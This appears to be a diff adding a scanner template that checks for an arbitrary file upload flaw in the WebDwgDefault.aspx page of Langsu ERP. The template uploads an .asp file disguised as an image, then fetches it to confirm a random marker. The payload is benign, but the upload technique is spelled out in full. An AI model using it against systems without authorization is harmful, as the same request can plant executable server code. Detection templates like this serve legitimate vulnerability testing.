@@ -1,0 +1,50 @@
+id: poc-yaml-lserp-webdwgdefault-aspx-anyfile-upload
+
+info:
+  name: 朗速ERP WebDwgDefault.aspx 任意文件上漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: '{{rand_base(4)}}'
+  t2: '{{base64(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/WebDwgDefault.aspx?IsSave=true&FileName={{t1}}.asp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.asp"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.asp"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
